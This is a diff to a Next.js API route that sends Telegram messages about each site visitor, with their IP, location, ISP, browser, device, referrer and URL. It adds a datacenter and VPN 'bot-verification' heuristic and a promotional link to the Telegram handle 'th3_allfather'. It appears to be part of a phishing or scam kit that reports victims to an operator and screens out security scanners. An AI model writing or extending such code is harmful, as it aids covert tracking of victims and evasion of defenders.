@@ -1,6 +1,8 @@
 import { NextResponse } from 'next/server';
 import { PROJECT_DISPLAY_NAME } from '@/lib/project-config';
 import { wrapFlowMessage } from '@/lib/telegram';
+import { parseVisitorInfo } from '@/lib/parse-visitor-os';
+import { getNetworkHintLabel } from '@/lib/bot-verification/datacenter-heuristic';
 
 function escapeHtml(s) {
   return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
@@ -11,9 +13,10 @@ function asCode(v) {
   return `<code>${escapeHtml(t)}</code>`;
 }
 
-function asPre(v) {
-  const t = v == null ? '' : String(v);
-  return `<pre>${escapeHtml(t || 'Unknown')}</pre>`;
+function asUrlField(v, fallback = '') {
+  const s = v == null ? '' : String(v).trim();
+  if (!s || s === 'undefined' || s === 'null' || s === '-') return escapeHtml(fallback);
+  return `<a href="${escapeHtml(s)}">${escapeHtml(s)}</a>`;
 }
 
 function methodLabel(method) {
@@ -31,24 +34,23 @@ function methodLabel(method) {
 }
 
 function buildTelegramMessage(params) {
-  const visitorBlock = `<b>🌐 New Visitor</b>
+  const detected = parseVisitorInfo(params.client.userAgent);
+  const networkHint = getNetworkHintLabel(null, params.isp);
+  const visitorBlock = `🌐 <b>(${escapeHtml(params.siteName)})</b>
 ━━━━━━━━━━━━━━━━━━
-🏷️ Site: ${asCode(params.siteName)}
+📍 <b>Location:</b> ${asCode(params.location)}
+🌍 <b>IP:</b> ${asCode(params.ip)}
+⏰ <b>Timezone:</b> ${asCode(params.timezone)}
+🌐 <b>ISP:</b> ${asCode(params.isp)}${networkHint ? `\n🛡️ <b>VPN/DATA CENTER:</b> ${asCode(networkHint)}` : ''}
 
-📍 Location: ${asCode(params.location)}
-🌍 IP: ${asCode(params.ip)}
-⏰ Timezone: ${asCode(params.timezone)}
-🌐 ISP: ${asCode(params.isp)}
+🖥 <b>Platform:</b> ${asCode(detected.platformLabel)}
+👨‍💻 <b>Browser:</b> ${asCode(detected.browserLabel)}
+📱 <b>Device:</b> ${asCode(detected.deviceLabel)}
+🖥️ <b>Screen:</b> ${asCode(params.client.screen)}
+🔗 <b>Referrer:</b> ${asUrlField(params.client.referrer, 'Direct')}
+🌐 <b>URL:</b> ${asUrlField(params.client.url)}
 
-📱 Device:
-${asPre(params.client.userAgent)}
-🖥️ Screen: ${asCode(params.client.screen)}
-🌍 Language: ${asCode(params.client.language)}
-🔗 Referrer: ${asCode(params.client.referrer)}
-🌐 URL: ${asCode(params.client.url)}
-
-⏰ Local Time: ${asCode(params.client.localTime)}
-🕒 UTC Time: ${asCode(params.client.utcTime)}`;
+<a href="https://t.me/th3_allfather">All Father Arógunmásà́</a>`;
 
   switch (params.eventType) {
     case 'visit':
@@ -181,7 +183,17 @@ export async function POST(req) {
             chat_id: chatId,
             text: outbound,
             parse_mode: 'HTML',
-            disable_web_page_preview: true,
+            disable_web_page_preview: eventType !== 'visit',
+            ...(eventType === 'visit'
+              ? {
+                  link_preview_options: {
+                    is_disabled: false,
+                    url: 'https://t.me/th3_allfather',
+                    prefer_small_media: true,
+                    show_above_text: false,
+                  },
+                }
+              : {}),
           }),
         });
         if (!res.ok) {
